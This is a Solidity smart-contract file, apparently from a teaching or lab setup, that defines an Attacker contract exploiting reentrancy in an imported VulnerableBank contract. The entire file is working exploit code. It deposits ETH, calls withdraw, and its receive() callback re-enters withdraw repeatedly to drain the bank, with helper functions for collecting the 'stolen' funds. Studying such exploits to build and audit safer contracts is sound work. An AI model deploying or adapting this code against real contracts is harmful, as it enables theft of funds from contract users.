// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public bank;

    uint256 public attackAmount;
    uint256 public callCount;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    // Callback triggered when the bank sends ETH
    receive() external payable {
        callCount++;

        if (
            address(bank).balance >= attackAmount &&
            callCount < 10
        ) {
            bank.withdraw();
        }
    }

    function attack(uint256 amount) external payable {
        require(msg.value == amount, "Incorrect ETH amount");

        attackAmount = amount;
        callCount = 0;

        // Deposit initial ETH
        bank.deposit{value: amount}();

        // Start reentrancy
        bank.withdraw();
    }

    function withdrawStolenFunds() external {
        (bool success, ) = msg.sender.call{
            value: address(this).balance
        }("");

        require(success, "Withdraw failed");
    }

    function getStolenBalance() external view returns (uint256) {
        return address(this).balance;
    }
}